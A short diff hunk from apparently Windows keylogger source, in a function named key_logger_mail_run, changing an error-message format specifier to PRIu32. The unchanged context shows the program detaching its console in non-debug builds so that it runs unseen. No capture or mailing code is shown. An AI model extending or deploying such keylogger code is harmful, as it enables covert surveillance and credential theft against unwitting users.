@@ -133,7 +133,7 @@ bool key_logger_mail_run(void)
 #ifndef DEBUG_BUILD
 	if (FALSE == FreeConsole())
 	{
-		(void)fprintf(stderr, "Failed to free console! (error code: %lu)\n", GetLastError());
+		(void)fprintf(stderr, "Failed to free console! (error code: %" PRIu32 ")\n", GetLastError());
 		return false;
 	}
 #endif /*< DEBUG_BUILD */
